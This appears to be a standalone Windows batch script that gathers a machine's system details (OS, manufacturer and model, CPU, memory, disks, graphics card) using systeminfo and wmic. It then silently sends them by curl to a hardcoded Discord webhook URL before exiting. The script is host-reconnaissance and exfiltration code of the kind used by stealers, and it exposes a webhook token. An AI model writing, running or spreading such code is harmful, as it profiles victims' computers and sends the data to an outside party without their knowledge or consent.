@echo off
setlocal enabledelayedexpansion

for /f "tokens=2 delims=:" %%a in ('systeminfo ^| findstr /C:"OS Name" /C:"OS Version" /C:"System Manufacturer" /C:"System Model"') do (
    set "system_info=!system_info! %%a"
)

for /f "skip=1 tokens=*" %%a in ('wmic cpu get Name^,NumberOfCores^,NumberOfLogicalProcessors /format:list') do (
    if not "%%a"=="" (
    set "cpu_info=!cpu_info! %%a"
    )
)

for /f "skip=1 tokens=*" %%a in ('wmic memorychip get Capacity^,Speed /format:list') do (
    if not "%%a"=="" (
        set "mem_info=!mem_info! %%a"
    )
)

for /f "skip=1 tokens=*" %%a in ('wmic diskdrive get Model^,Size /format:list') do (
    if not "%%a"=="" (
        set "disk_info=!disk_info! %%a"
    )
)

for /f "skip=1 tokens=*" %%a in ('wmic path win32_videocontroller get name /format:list') do (
    if not "%%a"=="" (
        set "gpu_info=!gpu_info! %%a"
    )
)

set "all_info=System Information: !system_info! Processor Information: !cpu_info! Memory Information: !mem_info! Disk Information: !disk_info! Display Adapter Information: !gpu_info!"
set "all_info=!all_info:\=\\!"
set "all_info=!all_info:"=\\"!"
set "all_info=!all_info:^!=^^!"

set "webhook=https://discord.com/api/webhooks/1331746234913787968/LEOrippG4WTHjQPVUOr4O1KhcP_vZ0FdUY92Kaojq0MqTTFlYr-zqkM7Ud39cPd5yJWP"
curl -X POST -H "Content-type: application/json" --data "{\"content\":\"%all_info%\"}" %webhook% && exit
